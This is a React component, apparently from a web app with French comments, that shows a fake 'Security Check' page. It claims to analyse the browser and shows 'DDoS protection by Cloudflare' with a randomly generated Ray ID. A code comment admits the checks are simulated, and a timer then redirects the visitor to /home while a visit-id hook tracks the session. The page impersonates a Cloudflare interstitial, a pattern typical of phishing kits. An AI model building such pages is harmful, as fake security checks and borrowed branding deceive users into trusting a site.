import { useEffect } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Loader2 } from "lucide-react";
import { useVisitId } from "@/hooks/use-visit-id";

export default function SecurityCheck() {
  const [, setLocation] = useLocation();
  // Initialiser le visitId (sera conservé pour toute la session)
  useVisitId();

  useEffect(() => {

    // Simulate security checks (bot detection, IP analysis, etc.)
    const timer = setTimeout(() => {
      setLocation("/home");
    }, 2500);

    return () => clearTimeout(timer);
  }, [setLocation]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4 font-sans text-gray-800">
      <div className="max-w-md w-full text-center space-y-6">
        <div className="flex justify-center mb-4">
          <ShieldCheck className="h-16 w-16 text-brand-blue animate-pulse" />
        </div>
        
        <h1 className="text-2xl font-bold text-brand-blue">
          Security Check
        </h1>
        
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="h-8 w-8 text-brand-orange animate-spin" />
          <p className="text-gray-500 text-sm">
            Analyzing your browser settings and verifying secure connection...
          </p>
        </div>

        <div className="text-xs text-gray-400 mt-8 pt-8 border-t border-gray-100">
          DDoS protection by <span className="font-semibold">Cloudflare</span>
          <br />
          Ray ID: {Math.random().toString(36).substr(2, 16).toUpperCase()}
        </div>
      </div>
    </div>
  );
}
